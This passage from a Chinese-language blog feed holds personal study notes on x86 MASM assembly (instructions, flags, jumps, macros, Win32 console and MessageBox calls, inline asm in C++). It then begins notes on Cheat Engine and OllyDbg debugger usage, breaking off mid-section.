class="line">;零扩展位（后者一定小于前者，前面补0）</span><br><span class="line">movzx r16,r8</span><br><span class="line">movzx r32,r16</span><br><span class="line">;符号扩展位（带符号扩展，负数前面补全1，整数补全0）</span><br><span class="line">movsx r16,r8</span><br><span class="line">movsx r32,r16</span><br><span class="line">;扩展指令集（i8086只有CBW和CWD，其他包括movzx都没有）</span><br><span class="line">CBW     ;al符号扩展ax</span><br><span class="line">CWD     ;ax符号扩展dx和ax</span><br><span class="line">CWDE    ;ax符号扩展eax</span><br><span class="line">CDQ     ;eax符号扩展edx和eax</span><br><span class="line"></span><br><span class="line">;非</span><br><span class="line">not reg/mem</span><br><span class="line">;异或</span><br><span class="line">xor reg,mem</span><br><span class="line">;测试，逻辑与（只改变状态标志）</span><br><span class="line">test reg,mem</span><br><span class="line"></span><br><span class="line">;算术移位（负数右移时前面补1）</span><br><span class="line">sal reg</span><br><span class="line">sar reg</span><br><span class="line"></span><br><span class="line">;循环移位</span><br><span class="line">rol reg,cl;不带进位左移</span><br><span class="line">ror reg,cl;不带进位右移</span><br><span class="line">rcl reg,cl;带进位左移</span><br><span class="line">rcr reg,cl;带进位右移</span><br></pre></td></tr></table></figure><h4 id="3-2-标志位操作"><a href="#3-2-标志位操作" class="headerlink" title="3.2 标志位操作"></a>3.2 标志位操作</h4><div class="table-container"><table><thead><tr><th>指令</th><th>功能</th><th>指令</th><th>功能</th></tr></thead><tbody><tr><td>clc</td><td>复位进位标志：CF=0</td><td>lahf</td><td>标志寄存器低字节内容传送到AH中</td></tr><tr><td>stc</td><td>置位进位标志：CF=1</td><td>sahf</td><td>AH内容传送到标志寄存器最低位</td></tr><tr><td>cmc</td><td>求反进位标志：0变1,1变0</td><td>pushf</td><td>标志寄存器地16位入栈</td></tr><tr><td>cld</td><td>复位方向标志：DF=0，串操作后地址增大</td><td>popf</td><td>堆栈顶部一个字量数据弹出到标志寄存器低16位</td></tr><tr><td>std</td><td>复位方向标志：DF=1，串操作后地址减小</td><td>pushfd</td><td>32位标志寄存器内容全部压入堆栈</td></tr><tr><td>cli</td><td>复位中断标志：IF=0，禁止可屏蔽中断</td><td>popfd</td><td>当前堆栈顶部一个双字数据弹出到标志寄存器</td></tr><tr><td>sti</td><td>置位中断标志：IF=1，允许可屏蔽中断</td><td></td></tr></tbody></table></div><h3 id="4-程序结构"><a href="#4-程序结构" class="headerlink" title="4 程序结构"></a>4 程序结构</h3><h4 id="4-1-跳转"><a href="#4-1-跳转" class="headerlink" title="4.1 跳转"></a>4.1 跳转</h4><div class="table-container"><table><thead><tr><th>助记符</th><th>标志位</th><th>英文含义</th><th>中文说明</th></tr></thead><tbody><tr><td>JZ / JE</td><td>ZF=1</td><td>Jump if Zero / Equal</td><td>等于零/相等</td></tr><tr><td>JNZ / JNE</td><td>ZF=0</td><td>Jump if Not Zero / Not Equal</td><td>不等于零/不相等</td></tr><tr><td>JS</td><td>SF=1</td><td>Jump if Sign</td><td>符号为负</td></tr><tr><td>JNS</td><td>SF=0</td><td>Jump if Not Sign</td><td>符号为正</td></tr><tr><td>JP / JPE</td><td>PF=1</td><td>Jump if Parity / Parity Even</td><td>1的个数为偶</td></tr><tr><td>JNP / JPO</td><td>PF=0</td><td>Jump if Not Parity / Parity Odd</td><td>1的个数为奇</td></tr><tr><td>JO</td><td>OF=1</td><td>Jump if Overflow</td><td>溢出</td></tr><tr><td>JNO</td><td>OF=0</td><td>Jump if Not Overflow</td><td>无溢出</td></tr><tr><td>JC / JB / JNAE</td><td>CF=1</td><td>Jump if Carry / Below / Not Above or Equal</td><td>进位/低于/不高于等于</td></tr><tr><td>JNC / JNB / JAE</td><td>CF=0</td><td>Jump if Not Carry / Not  Below / Above or Equal</td><td>无进位/不低于/高于等于</td></tr><tr><td>JBE / JNA</td><td>CF=1 or ZF=1</td><td>Jump if Below or Equal /  Not Above</td><td>低于等于/不高于</td></tr><tr><td>JNBE / JA</td><td>CF=0 or ZF=0</td><td>Jump if Not Below or Equal / Above</td><td>不低于等于/高于</td></tr><tr><td>JL / JNGE</td><td>SF != OF</td><td>Jump if Less / Not Greater or Equal</td><td>小于/不大于等于</td></tr><tr><td>JNL / JGE</td><td>SF=OF</td><td>Jump if Not Less / Greater or Equal</td><td>不小于/大于等于</td></tr><tr><td>JLE / JNG</td><td>SF != OF or ZF=1</td><td>Jump if Less or Equal / Not Greater</td><td>小于等于/不大于</td></tr><tr><td>JNLE / JG</td><td>SF=OF and ZF=0</td><td>Jump if Not Less or Equal / Greater</td><td>不小于等于/大于</td></tr></tbody></table></div><h4 id="4-2-分支循环"><a href="#4-2-分支循环" class="headerlink" title="4.2 分支循环"></a>4.2 分支循环</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ecx=0跳转，否则向下</span><br><span class="line">jcxz/jecxz label</span><br></pre></td></tr></table></figure><h4 id="4-3-结构体"><a href="#4-3-结构体" class="headerlink" title="4.3 结构体"></a>4.3 结构体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义结构体</span><br><span class="line">Snake struct</span><br><span class="line">lendword?</span><br><span class="line">xdword?</span><br><span class="line">ydword?</span><br><span class="line">Snake ends</span><br><span class="line">;初始化</span><br><span class="line">sn1 Snake &lt;5,2,3&gt;</span><br><span class="line">;预留空间</span><br><span class="line">Snake 100 dup(&lt;&gt;)</span><br><span class="line">;字段引用</span><br><span class="line">mov sn1.len,100</span><br><span class="line">;匿名寻址</span><br><span class="line">mov [ebx].Snake.x,eax</span><br></pre></td></tr></table></figure><h3 id="5-模块化编程"><a href="#5-模块化编程" class="headerlink" title="5 模块化编程"></a>5 模块化编程</h3><h4 id="5-1-源程序框架"><a href="#5-1-源程序框架" class="headerlink" title="5.1 源程序框架"></a>5.1 源程序框架</h4><blockquote><p><a href="https://blog.csdn.net/bcbobo21cn/article/details/108571303">Win32汇编基本编程框架</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 源程序框架</span><br><span class="line">.686;编译模式</span><br><span class="line">.model flat,stdcall;默认模式</span><br><span class="line">option casemap:none;编译器大小写不敏感</span><br><span class="line"></span><br><span class="line">include io32.inc;头文件</span><br><span class="line"></span><br><span class="line">.stack [堆栈段大小]</span><br><span class="line">.data</span><br><span class="line">msg dword 1;初始化变量</span><br><span class="line">.data?</span><br><span class="line">msg dword ? ;未初始化变量</span><br><span class="line">.const</span><br><span class="line">...;常量定义</span><br><span class="line">.code</span><br><span class="line">... ;普通代码</span><br><span class="line">start:</span><br><span class="line">    ... ;执行代码</span><br><span class="line">    [exit 0] ;退出代码</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h4 id="5-2-函数传参"><a href="#5-2-函数传参" class="headerlink" title="5.2 函数传参"></a>5.2 函数传参</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret      ;无参返回：出栈返回地址</span><br><span class="line">ret i16  ;带参返回：出栈返回地址，ESP=ESP+i16</span><br><span class="line"></span><br><span class="line">;传参方式</span><br><span class="line">;1.寄存器传参，返回可用寄存器返回（一般是EAX）</span><br><span class="line">;2.堆栈传参，返回一般不用堆栈</span><br><span class="line">;3.内存传参（指针）</span><br><span class="line">;4.多参数传参：将参数地址存入堆栈，依次取得堆栈数据</span><br></pre></td></tr></table></figure><h4 id="5-3-头文件"><a href="#5-3-头文件" class="headerlink" title="5.3 头文件"></a>5.3 头文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;引用头文件</span><br><span class="line">include *.inc</span><br><span class="line">;引用库文件</span><br><span class="line">includelib *.lib</span><br><span class="line"></span><br><span class="line">public 标识符[,标识符...]            ;可被外部程序使用</span><br><span class="line">extern 标识符:类型[,标识符:类型...]    ;数据来自外部程序</span><br><span class="line">;案例</span><br><span class="line">;主程序</span><br><span class="line">public write</span><br><span class="line">extern temp:dword</span><br><span class="line">;子程序</span><br><span class="line">extern rdhd:near</span><br><span class="line">public temp</span><br></pre></td></tr></table></figure><h4 id="5-4-宏定义"><a href="#5-4-宏定义" class="headerlink" title="5.4 宏定义"></a>5.4 宏定义</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;;宏</span><br><span class="line">;定义宏</span><br><span class="line">宏名 macro[形参表]</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;使用宏</span><br><span class="line">宏名[实参表]</span><br><span class="line">;在汇编时，宏指令被汇编程序用宏定义的代码序列替代。</span><br><span class="line"></span><br><span class="line">;宏的局部标号伪指令（必须是marcro语句后的第一条语句，两者间不能有分号或注释）</span><br><span class="line">local 标号列表</span><br><span class="line"></span><br><span class="line">;删除宏名表（逗号隔开宏名）</span><br><span class="line">purge 宏名表</span><br><span class="line">;立刻停止后面部分的宏展开</span><br><span class="line">extim</span><br><span class="line"></span><br><span class="line">;;重复汇编</span><br><span class="line">;参数值重复</span><br><span class="line">repeat 重复次数</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">;参数个数重复</span><br><span class="line">for 形参,&lt;实参表&gt;</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;案例</span><br><span class="line">for regard,&lt;eax,ebx,ecx,edx&gt;</span><br><span class="line">push regad</span><br><span class="line">endm</span><br><span class="line">;=&gt; </span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">push ecx</span><br><span class="line">push edx</span><br><span class="line"></span><br><span class="line">;按字符个数</span><br><span class="line">forc 形参,字符串</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;案例（结果同理上，pop edx...）</span><br><span class="line">forc regad,dcba</span><br><span class="line">pop e&amp;regad&amp;x</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">;条件汇编（按条件汇编指定语句）</span><br><span class="line">ifxx 表达式</span><br><span class="line">分支语句体1</span><br><span class="line">[else</span><br><span class="line">分支语句体2]</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>宏操作符</th><th>作用</th></tr></thead><tbody><tr><td>&amp;</td><td>替换操作符，用于将参数与其他字符分开。如果参数紧接在其他字符之前或之后，或者参数出现在带引号的字符串中，就必须使用该伪操作符</td></tr><tr><td>&lt;&gt;</td><td>字符串传递操作符，用于括起字符串。在宏调用中，如果传递的字符串实参数含有逗号、空格等间隔符号、则必须用这对操作符，以保证字符串的完整</td></tr><tr><td>!</td><td>转义操作符，用于指示其后的一个字符作为一般字符，而不含特殊意义</td></tr><tr><td>%</td><td>表达式操作符，用在宏调用中，表示将后跟的一个表达式的值作为实参，而不是将表达式本身作为参数</td></tr><tr><td>;;</td><td>宏注释符，用于表示在宏定义中的注释。采用这个符号的注释，在宏展开时不出现</td></tr><tr><td>: reg</td><td>说明宏定义设定的参数在调用时不可缺少</td></tr><tr><td>: =默认值</td><td>设定参数默认值</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>格式</th><th>功能说明</th></tr></thead><tbody><tr><td>if 表达式</td><td>汇编程序求出表达式的值，不为0满足条件</td></tr><tr><td>ife 表达式</td><td>汇编程序求出表达式的值，为0满足条件</td></tr><tr><td>ifdef 符号</td><td>符号已定义（内部定义或声明外部定义），则满足条件</td></tr><tr><td>ifndef 符号</td><td>符号未定义，则满足条件</td></tr><tr><td>ifb &lt;形参&gt;</td><td>用在宏定义体内。如果宏调用没有用实参替代该形参，则满足条件</td></tr><tr><td>ifnb &lt;形参&gt;</td><td>用在宏定义体内。如果宏调用用实参替代该形参，则满足条件</td></tr><tr><td>ifidn &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2相同则条件满足；区分大小写</td></tr><tr><td>ifdif &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2不相同则条件满足；区分大小写</td></tr><tr><td>ifidni &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2相同则条件满足；不区分大小写</td></tr><tr><td>ifdifi &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2不相同则条件满足；不区分大小写</td></tr></tbody></table></div><h4 id="5-5-简单案例"><a href="#5-5-简单案例" class="headerlink" title="5.5 简单案例"></a>5.5 简单案例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;弹窗显示hello world</span><br><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc</span><br><span class="line">include \masm32\include\kernel32.inc</span><br><span class="line">include \masm32\include\user32.inc</span><br><span class="line"></span><br><span class="line">includelib \masm32\lib\kernel32.lib</span><br><span class="line">includelib \masm32\lib\user32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">msg db &#x27;Hello, world!&#x27;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">    invoke  MessageBox,NULL,offset msg,offset msg,MB_OK ;用于弹窗</span><br><span class="line">    invoke  ExitProcess,0 ;用于弹窗</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><hr><h2 id="二、Windows编程"><a href="#二、Windows编程" class="headerlink" title="二、Windows编程"></a>二、Windows编程</h2><h3 id="1-库调用"><a href="#1-库调用" class="headerlink" title="1 库调用"></a>1 库调用</h3><ul><li><p>连接</p><ul><li><p>静态连接（.lib）</p><blockquote><p>连接程序会自动从库文件中抽取需要的子程序插入到可执行代码中</p></blockquote></li><li><p>动态连接（.dll）</p><blockquote><p>每次需要执行指定代码时才会去动态连接库中找到对应的代码执行。</p></blockquote></li></ul></li><li><p>库</p><ul><li><p>kernel32.dll</p><blockquote><p>系统服务函数，主要处理内存管理和进度调度。</p></blockquote></li><li><p>user32.dll</p><blockquote><p>用户接口函数，主要控制用户界面。</p></blockquote></li><li><p>gdi32.dll</p><blockquote><p>图形设备函数，主要负责图形方面的操作。</p></blockquote></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;过程声明</span><br><span class="line">;过程名：proc定义的过程名、API函数名、高级语言函数名</span><br><span class="line">;调用距离：near，far。省略由存储模型自己决定</span><br><span class="line">;语言类型：STDCALL（系统API调用规范）、C（C语言调用规范）等。如果该过程使用的语言类型与存储模型model伪指令定义的相同，这里可以省略，否则必须说明</span><br><span class="line">过程名 proto [调用距离][语言类型][[,参数]:类型]...</span><br><span class="line"></span><br><span class="line">;过程调用</span><br><span class="line">invoke 过程名[,参数,...]</span><br><span class="line"></span><br><span class="line">;案例：程序退出函数</span><br><span class="line">;kernel32.dll中，用于结束一个进程及其所有线程</span><br><span class="line">void ExitProcess(UINT uExitCode);</span><br><span class="line">;汇编中定义</span><br><span class="line">ExitProcess proto,:dword</span><br><span class="line">;汇编中使用</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">;将退出做成宏（该宏存在于io32.inc中）</span><br><span class="line">exit marco dwexitcode</span><br><span class="line">invoke ExitProcess,dwexitcode</span><br><span class="line">endm</span><br><span class="line">;使用</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><h3 id="2-控制台程序"><a href="#2-控制台程序" class="headerlink" title="2 控制台程序"></a>2 控制台程序</h3><blockquote><p>句柄：32位无符号整数，用来唯一确定一个对象，如输入设备、输出设备或一个文件、图形等。</p><p>API 函数返回值保存在 EAX 中。</p><p>输出函数：</p><ul><li><p>Windows 95/98 操作系统不支持以W结尾的函数。</p></li><li><p>Windows NT/2000/XP 操作系统的内置字符集是 Unicode，在这些操作系统中如果调用以A结尾的函数，操作系统会首先将ANSI字符转换成Unicode字符，然后再调用以W结尾的对应函数。</p></li><li><p>在微软MSDN文档中，函数名尾部的字母 A 或 W 被省略，汇编语言使用时需要重新声明。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;控制台函数都存在kernel32.dll中，所以要导入kernel32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">STD_INPUT_HANDLE = -10 ;标准输入句柄，值为-10</span><br><span class="line">STD_OUTPUT_HANDLE = -11 ;标准输出句柄，值为-11</span><br><span class="line">STD_ERROR_HANDLE = -12 ;标准错误句柄，值为-12</span><br><span class="line"></span><br><span class="line">;获得句柄函数</span><br><span class="line">HANDLE GetStdHandle(dword nStdHandle);</span><br><span class="line">;汇编使用</span><br><span class="line">GetStdHandle proto,nStdHandle:dword</span><br><span class="line">invoke GetStdHandle,STD_OUTPUT_HANDLE</span><br><span class="line"></span><br><span class="line">;输出函数声明(ASCII:WriteConsoleA,Unicode:WriteConsoleW)</span><br><span class="line">WriteConsole equ&lt;WriteConsoleA&gt;;重新声明</span><br><span class="line">;输出函数</span><br><span class="line">Bool WriteConsole(</span><br><span class="line">HANDLE HConsoleOutput,</span><br><span class="line">CONST VOID *lpBuffer,</span><br><span class="line">DWORD nNumberOfCharsToWrite,</span><br><span class="line">LPDWORD lpNumberOfCharsWritten,</span><br><span class="line">LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">;汇编使用</span><br><span class="line">WriteConsoleA proto,</span><br><span class="line">handle:dword,    ;输出句柄</span><br><span class="line">pbuffer:dword,   ;输出缓冲区指针</span><br><span class="line">bufsize:dword,   ;输出缓冲区大小</span><br><span class="line">pcount:dword,    ;实际输出字符数量的指针</span><br><span class="line">lpreserved:dword ;保留（必须为0）</span><br><span class="line">invoke GetStdHandle,STD_OUTPUT_HANDLE</span><br><span class="line">invoke WriteConsole,eax,addr msg,sizeof msg,addr outsize(.data中dword ?),0</span><br><span class="line"></span><br><span class="line">;输入函数</span><br><span class="line">BOOL ReadConsole(</span><br><span class="line">HANDLE hConsoleInput,</span><br><span class="line">LPVOID lpBuffer</span><br><span class="line">DOWRD nNumberOfCharsToRead,</span><br><span class="line">LPDWORD lpNumberOfCharsRead,</span><br><span class="line">LPVOID lpReversed</span><br><span class="line">)</span><br><span class="line">;汇编使用</span><br><span class="line">ReadConsoleA proto,</span><br><span class="line">handle:dword,     ;输入句柄</span><br><span class="line">pbuffer:dword,    ;输入缓冲区指针</span><br><span class="line">maxsize:dword,    ;要读取字符的最大数量</span><br><span class="line">pBytesRead:dword, ;实际读取字符数量的指针</span><br><span class="line">notUsed:dword     ;保留（必须为0）</span><br><span class="line">ReadConsole equ&lt;ReadConsoleA&gt;</span><br><span class="line">invoke GetStdHandle,STD_INPUT_HANDLE</span><br><span class="line">invoke ReadConsole,eax,addr _inbuffer(.data中byte 255 dup(0)),255,addr _insize(.data中dword ?),0</span><br><span class="line"></span><br><span class="line">;获得控制台模式</span><br><span class="line">GetConsoleMode proto,hConsoleHandle:dword,lpMode:dword</span><br><span class="line">;设置控制台模式(dwMode=0:单字符模式（可以读退格回车tab等，不能读ESC，F1-F12,ctrl,alt,shift,home,end等）)</span><br><span class="line">SetConsoleMode proto,hConsoleHandle:dword,dwMode:dword</span><br></pre></td></tr></table></figure><h3 id="3-图形化界面"><a href="#3-图形化界面" class="headerlink" title="3 图形化界面"></a>3 图形化界面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;消息窗口。（在USER32.dll中）创建失败返回0</span><br><span class="line">int MessageBox(</span><br><span class="line">HWND hWnd,;父窗口（0表示没有）</span><br><span class="line">LPCTSTR lpText,;内容字符串首地址（0结尾）</span><br><span class="line">LPCTSTR lpCaption,;标题字符串首地址（0结尾）</span><br><span class="line">UINT uType;窗口选项：MB_OK(0):OK,MB_OKCANCEL(1):OK&amp;&amp;Cancel</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">;获取时间函数</span><br><span class="line">void GetLocalTime(LPSYSTEMTIME lpSystemTime);</span><br><span class="line">;汇编语言</span><br><span class="line">GetLocalTime proto,:dword</span><br><span class="line">SYSTEMTIME struct(年月星期日时分秒毫秒，word型)</span><br><span class="line">mytime SYSTEMTIME &lt;&gt;</span><br><span class="line">invoke GetLocalTime,addr mytime</span><br><span class="line"></span><br><span class="line">;图形化界面</span><br></pre></td></tr></table></figure><h3 id="4-高级语言特性"><a href="#4-高级语言特性" class="headerlink" title="4 高级语言特性"></a>4 高级语言特性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义子程序</span><br><span class="line">label_name proc [调用距离][语言类型][作用范围][&lt;起始参数&gt;][USES寄存器列表][形参:类型,...]</span><br><span class="line">local 参数表</span><br><span class="line">...;</span><br><span class="line">label_name endp</span><br><span class="line">;语言类型：SRDCALL,C等</span><br><span class="line">;作用范围：public,private,export(隐含了public和far)</span><br><span class="line"></span><br><span class="line">;伪指令条件if</span><br><span class="line">.IF expr</span><br><span class="line">statement</span><br><span class="line">[.ELSEIF expr</span><br><span class="line">statement ]</span><br><span class="line">[.ELSE</span><br><span class="line">statement ]</span><br><span class="line">.ENDIF</span><br><span class="line"></span><br><span class="line">;伪指令while</span><br><span class="line">.WHILE expr</span><br><span class="line">...</span><br><span class="line">.ENDW</span><br><span class="line"></span><br><span class="line">;伪指令重复</span><br><span class="line">.REPEAT</span><br><span class="line">...</span><br><span class="line">.UNTIL expr</span><br><span class="line">;另一种形式</span><br><span class="line">.REPEAT</span><br><span class="line">...</span><br><span class="line">.UNTILCXZ [expr] ;ECX-=1,直到ECX=0或者条件为真</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>操作符（大于小于与或非同C语言）</th><th>功能</th></tr></thead><tbody><tr><td>&amp;</td><td>位测试</td></tr><tr><td>CARRY?</td><td>CF=1?</td></tr><tr><td>OVERFLOW?</td><td>OF=1?</td></tr><tr><td>PARITY?</td><td>PF=1?</td></tr><tr><td>SIGH?</td><td>SF=1?</td></tr><tr><td>ZERO?</td><td>ZF=1?</td></tr></tbody></table></div><hr><h2 id="三、与-C-混合编程"><a href="#三、与-C-混合编程" class="headerlink" title="三、与 C++ 混合编程"></a>三、与 C++ 混合编程</h2><h3 id="1-VS配置"><a href="#1-VS配置" class="headerlink" title="1 VS配置"></a>1 VS配置</h3><blockquote><ol><li>项目——生成依赖项——生成自定义——masm</li><li>Debug模式要是x86</li><li><a href="https://blog.csdn.net/luoyu510183/article/details/109429007">x64配置方式</a></li></ol></blockquote><h3 id="2-嵌入汇编"><a href="#2-嵌入汇编" class="headerlink" title="2 嵌入汇编"></a>2 嵌入汇编</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    __asm ;多条嵌入</span><br><span class="line">    &#123;</span><br><span class="line">        lea eax,a</span><br><span class="line">        mov eax,15</span><br><span class="line">        mov a,eax</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">;单条嵌入多行</span><br><span class="line">__asm mov eax,01H</span><br><span class="line">__asm mov dx,0D007H</span><br><span class="line">__asm out dx,eax</span><br><span class="line">;单条嵌入单行（空格隔开）</span><br><span class="line">__asm mov eax,01H __asm mov dx,0D007H __asm out dx,eax</span><br></pre></td></tr></table></figure><hr><h2 id="四、DOS环境程序设计"><a href="#四、DOS环境程序设计" class="headerlink" title="四、DOS环境程序设计"></a>四、DOS环境程序设计</h2><blockquote><p><a href=".\a8fb0b6e">text::基础汇编</a></p></blockquote><h3 id="1-DOS编程"><a href="#1-DOS编程" class="headerlink" title="1 DOS编程"></a>1 DOS编程</h3><h3 id="2-串操作"><a href="#2-串操作" class="headerlink" title="2 串操作"></a>2 串操作</h3><h3 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3 输入输出"></a>3 输入输出</h3><h3 id="4-中断"><a href="#4-中断" class="headerlink" title="4 中断"></a>4 中断</h3><hr><h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="1-浮点指令"><a href="#1-浮点指令" class="headerlink" title="1 浮点指令"></a>1 浮点指令</h3><h4 id="1-1-浮点数"><a href="#1-1-浮点数" class="headerlink" title="1.1 浮点数"></a>1.1 浮点数</h4><ul><li><p>浮点数</p><blockquote><p>单精度：1位符号位，8位指数，23位有效数字。（D31-D0）</p><p>双精度：1位符号位，11位指数，52位有效数字。（D63-D0）</p></blockquote></li><li><p>浮点寄存器</p><blockquote><p>x87FPU浮点寄存器：80位数据寄存器，2位标记寄存器。分别是FPR0、tag0，FPR1、tag1…FPR7、tag7。</p><p>x87FPU的8个数据寄存器存取是栈原则且首尾循环。</p><p>标记寄存器标记：</p><ul><li>00——对应数据寄存器存有有效数据。</li><li>01——对应数据寄存器数据为0。</li><li>10——对应数据寄存器数据是特殊数据，如NaN，无限大或非规格化数据。</li><li>11——对应数据寄存器内无数据。</li></ul></blockquote></li><li><p>浮点状态寄存器</p><blockquote></blockquote></li></ul><h4 id="1-2-浮点指令"><a href="#1-2-浮点指令" class="headerlink" title="1.2 浮点指令"></a>1.2 浮点指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;[]中数据入栈</span><br><span class="line">fld []</span><br><span class="line">;数据出栈到[]中</span><br><span class="line">fst []</span><br><span class="line">;出栈并清空栈顶</span><br><span class="line">fstp []</span><br></pre></td></tr></table></figure><h3 id="2-多媒体指令"><a href="#2-多媒体指令" class="headerlink" title="2 多媒体指令"></a>2 多媒体指令</h3><h3 id="3-64位指令"><a href="#3-64位指令" class="headerlink" title="3 64位指令"></a>3 64位指令</h3><hr><h2 id="六、编程技巧"><a href="#六、编程技巧" class="headerlink" title="六、编程技巧"></a>六、编程技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;清空ebx</span><br><span class="line">xor ebx,ebx</span><br><span class="line"></span><br><span class="line">;预留空间</span><br><span class="line">a dword ?</span><br><span class="line"></span><br><span class="line">;windows换行</span><br><span class="line">endl equ &lt;0DH,0AH&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工具</title>
      <link href="/posts/68e517a.html"/>
      <url>/posts/68e517a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse工具"><a href="#Reverse工具" class="headerlink" title="Reverse工具"></a>Reverse工具</h1><hr><h2 id="一、反汇编"><a href="#一、反汇编" class="headerlink" title="一、反汇编"></a>一、反汇编</h2><blockquote><p>VS写的程序应该选择release版本，因为release是发布版本，更接近实际情况。</p></blockquote><h3 id="1-CE"><a href="#1-CE" class="headerlink" title="1 CE"></a>1 CE</h3><blockquote><p>本地运行的exe改内存</p></blockquote><h3 id="2-OD"><a href="#2-OD" class="headerlink" title="2 OD"></a>2 OD</h3><blockquote><p>动态反汇编调试</p></blockquote><h4 id="2-1-基本窗口"><a href="#2-1-基本窗口" class="headerlink" title="2.1 基本窗口"></a>2.1 基本窗口</h4><ol><li><p>顶部栏</p><blockquote><p>运行：F9</p><p>重开：Ctrl + F2</p><p>单步步过：F8</p><p>单步步入：F7</p><p>运行到选定位置：F4</p><p>执行到返回：Ctrl + F9</p><p>执行到用户代码：Alt + F9</p><p>断点窗口：Alt + B</p><p>查看上一步：-</p><p>查看下一步：+</p><p>查看当前指令地址：*</p></blockquote></li><li><p>反汇编窗口</p><blockquote><p>显示被调试程序的反汇编代码。</p><p>断点：F2 / 右键——Breakpoint——Toggle。</p><p>查看或修改具体汇编代码：双击Command中代码。</p><p>Comments：注释，点击可以关闭。</p><p>添加注释：双击Comments中的指定行。</p><p>找函数或地址：Ctrl + G / 右键——goto——Expression（其他窗口同理）</p><p>重新分析代码：右键——Analysis——Analyse code</p><p>窗口属性：右键——Appearance</p></blockquote></li><li><p>寄存器窗口</p><blockquote><p>显示当前所选线程的CPU寄存器信息。</p></blockquote></li><li><p>信息窗口</p><blockquote><p>选中的语句的相关信息。</p></blockquote></li><li><p>数据窗口</p><blockquote><p>内存或文件的内容。</p><p>Value：值，点击可以切换出ASCII码等窗口。（右键显示详细信息）</p></blockquote></li><li><p>堆栈窗口</p><blockquote><p>显示当前线程的堆栈。</p><p>跳转到指定位置：回车。</p></blockquote></li></ol><h4 id="2-2-调试流程"><a href="#2-2-调试流程" class="headerlink" title="2.2 调试流程"></a>2.2 调试流程</h4><ol><li>打开文件</li><li>在反汇编窗口用Ctrl + G定位函数名</li><li>F2加断点</li><li>F9执行</li><li>分析堆栈，回车跳转</li></ol><h4 id="2-3-插件"><a href="#2-3-插件" class="headerlink" title="2.3 插件"></a>2.3 插件</h4><h5 id="2-3-1-command"><a href="#2-3-1-command" class="headerlink" title="2.3.1 command"></a>2.3.1 command</h5><blockquote><p><code>bp [addr] / function</code>：给指定反汇编窗口地址或函数入口加断点。</p><p><code>bc [addr] / function</code>：清除断点</p><p><code>db / dw / dd / dc [addr]</code>：跳转到指定数据窗口的地址处，以 字节 /字 / 双字 / 字符方式显示数据。</p><p><code>? reg</code>：查看指定寄存器值（除了<code>? eax</code>也可以<code>? ebp-8</code>）</p></blockquote><h4 id="2-4-技巧"><a href="#2-4-技巧" class="headerlink" title="2.4 技巧"></a>2.4 技巧</h4><ol><li><p>Command中带有详细注释</p><blockquote><p>VS在编译时会生成一个exe和pdb文件，pdb中会保留调试信息。所以若pdb文件存在，OD在读取exe时会同时读取pdb文件，将注释信息加载到OD中，也可以在OD的Options中设置。</p></blockquote></li><li><p><code>[local.num]</code></p><blockquote><p>表示是第几个局部变量，如<code>[local.1]</code>表示是函数中第一个局部变量，以此类推。（按栈的顺序，并非源代码的定义的顺序）</p></blockquote></li></ol><h4 id="2-5-问题"><a href="#2-5-问题" class="headerlink" title="2.5 问题"></a>2.5 